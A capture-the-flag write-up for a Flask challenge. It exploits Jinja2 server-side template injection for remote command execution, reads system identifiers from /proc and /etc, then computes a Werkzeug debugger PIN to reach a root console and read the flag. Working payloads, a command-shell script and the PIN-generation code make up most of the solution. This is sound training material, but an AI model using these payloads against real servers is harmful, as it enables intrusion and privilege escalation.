# XYZ E-Municipality

## Description

Can you find the secret track?

Challenge Files: [https://master-platform-bucket.s3.amazonaws.com/challenges/f7bab6f2-dd2d-40fc-9cb3-a4b8dd452a0c/public.zip](https://master-platform-bucket.s3.amazonaws.com/challenges/f7bab6f2-dd2d-40fc-9cb3-a4b8dd452a0c/public.zip)

## Source

```python
import os
import requests
from flask import Flask, render_template, render_template_string, request

app = Flask(__name__)
app.static_folder = "static"
basedir = os.path.abspath(os.path.dirname(__file__))

def sanitize_string(template):
    global_vars = ["self", "request", "session", "g", "app"]
    for var in global_vars:
        template = "{% set " + var + " = None %}\n" + template
    return template

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/generate_certificate", methods=["POST"])
def generate_certificate():
    social_id = request.form["social_id"]
    certificate_template = requests.get("http://localhost:8000/certificate-template").text

    with open(f"{basedir}/templates/generate.html", "r") as f:
        content = f.read()
        content = content.replace("{{CERTIFICATE}}", certificate_template.replace("{{ social_id }}", social_id))

    return render_template_string(sanitize_string(content), social_id=social_id)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

## Solution

`render_template_string` functions is clear indicator for SSTI. There's `sanitize_string` function for `content` which we will need to bypass.

![XYZ E-Municipality.png](/assets/ctf/idex.ctf.ae/xyz-e-municipality.png)

![XYZ E-Municipality-1.png](/assets/ctf/idex.ctf.ae/xyz-e-municipality-1.png)

SSTI confirmed with 
::: raw
```js
{{7*7}}
```
::: 

![XYZ E-Municipality-2.png](/assets/ctf/idex.ctf.ae/xyz-e-municipality-2.png)

[https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jinja2-python](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jinja2-python)

There's many payloads to choose, but my favorite is 
```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

![XYZ E-Municipality-3.png](/assets/ctf/idex.ctf.ae/xyz-e-municipality-3.png)

`/flag.txt` is only readable by root and we are `ctf-player`...

![XYZ E-Municipality-4.png](/assets/ctf/idex.ctf.ae/xyz-e-municipality-4.png)

```python
from requests import Session
from bs4 import BeautifulSoup as BS

URL = 'https://4001b944135369f22176af00aaff7753.chal.ctf.ae/generate_certificate'

with Session() as session:
    while True:
        cmd = '{{ cycler.__init__.__globals__.os.popen("%s").read() }}' % input("Command: ")
        resp = session.post(URL, data={ 'social_id': cmd })
        result = BS(resp.text, 'html.parser').find('b').get_text(strip=True)[:-1]
        print(result)
```

Root is running the other application we can potentially hijack
```bash
Command: ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   2576   904 ?        Ss   06:24   0:00 /bin/sh /run.sh
ctf-pla+    12  0.1  0.4 188896 36776 ?        Sl   06:24   0:01 python3 /var/www/municipality/main.py
root        13  0.0  0.3  34136 29852 ?        S    06:24   0:00 python3 /var/www/employees-portal/app.py
root        21  0.1  0.3 185436 30212 ?        Sl   06:24   0:01 /usr/local/bin/python3 /var/www/employees-portal/app.py
ctf-pla+  1974  0.0  0.0   2576   912 ?        S    06:41   0:00 /bin/sh -c ps aux
ctf-pla+  1975  0.0  0.0   8476  4328 ?        R    06:41   0:00 ps aux
```

```bash
Command: find .
.
./employees-portal
./employees-portal/templates
./employees-portal/templates/view-requests.html
./employees-portal/app.py
./municipality
./municipality/static
./municipality/static/arrow_forward.svg
./municipality/static/styles.css
./municipality/templates
./municipality/templates/index.html
./municipality/templates/generate.html
./municipality/main.py
```

It's running in Debug mode and we could leak PIN code to access it (?) Not sure how without frontend yet.
```python
Command: cat ./employees-portal/app.py
...
if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=8000)
```

[https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html)

```bash
# getattr(mod, '__file__', None),
Command: find / -name app.py 2>/dev/null
/var/www/employees-portal/app.py
/usr/local/lib/python3.8/site-packages/flask/sansio/app.py
/usr/local/lib/python3.8/site-packages/flask/app.py
```

I think for node address we need `eth1`
```bash
# str(uuid.getnode()),  /sys/class/net/ens33/address
Command: cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
10.200.0.1       0x1         0x2         12:68:5c:11:3e:61     *        eth1

Command: cat /sys/class/net/eth1/address 
12:75:ea:0f:af:f1

>>> print(int('12:75:ea:0f:af:f1'.replace(':',''),16))
20297647370225

Command: cat cat /sys/class/net/eth0/address 
0a:58:a9:fe:ac:02

>>> print(int('0a:58:a9:fe:ac:02'.replace(':',''),16)) 
11375925439490
```

```bash
# get_machine_id(), /etc/machine-id
Command: cat /etc/machine-id

Command: cat /proc/sys/kernel/random/boot_id
b9d8e64c-ed6f-4f6a-985f-6139ae3fdc75

Command: cat /proc/self/cgroup                                                                      
11:devices:/ecs/bb9d590b113447f5a7d749f1915040bb/bb9d590b113447f5a7d749f1915040bb-2096071445
10:pids:/ecs/bb9d590b113447f5a7d749f1915040bb/bb9d590b113447f5a7d749f1915040bb-2096071445
...
```

After gathering information use the script in HackTricks to get pin code, first I tried using eth0 interface to generate it.
```python
import hashlib
from itertools import chain
probably_public_bits = [
    'root',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '11375925439490',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd5b86c0d-c7e8-4c60-95fe-678fb643f8bf' + 'bb9d590b113447f5a7d749f1915040bb-2096071445'  # get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit: continue
    if isinstance(bit, str): bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

During testing I got `{"auth": false, "exhausted": true}` status, `exhausted` means that PIN is perma blocked 💀

Not sure why but **eth0** was required instead of **eth1** to make the PIN work...

First to authenticate we need a SECRET value, it's stored in HTML so just http request and grab it.
```bash
Command: curl 0:8000/console                                                                           
...
    <script>
      var CONSOLE_MODE = true,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "1mLvds1fpjxjox8bzYIm";
    </script>
...
```

Now we can authenticate and grab cookies
```bash
Command: curl -i 0:8000/console\"?__debugger__=yes&cmd=pinauth&pin=130-025-898&s=1mLvds1fpjxjox8bzYIm\" 
HTTP/1.1 200 OK
Server: Werkzeug/3.0.6 Python/3.8.20
Date: Thu, 20 Feb 2025 08:55:11 GMT
Content-Type: application/json
Content-Length: 34
Set-Cookie: __wzd3f9bc784a86d4cf7f5d8=1740041711|2b5b4dfde301; HttpOnly; Path=/; SameSite=Strict
Connection: close

{"auth": true, "exhausted": false}
```

```bash
Command: curl 0:8000\"/console?&__debugger__=yes&cmd=open('/flag.txt').read()&frm=0&s=1mLvds1fpjxjox8bzYIm\" -b \"__wzd3f9bc784a86d4cf7f5d8=1740041711|2b5b4dfde301\"
>>> open(&#39;/flag.txt&#39;).read()
<span class="string">&#39;flag{gYDTW6Avx6q6HCc7pEBKRW3AoWDYa8xu}\n&#39;</span>
```

::: tip Flag
`flag{gYDTW6Avx6q6HCc7pEBKRW3AoWDYa8xu}`
:::

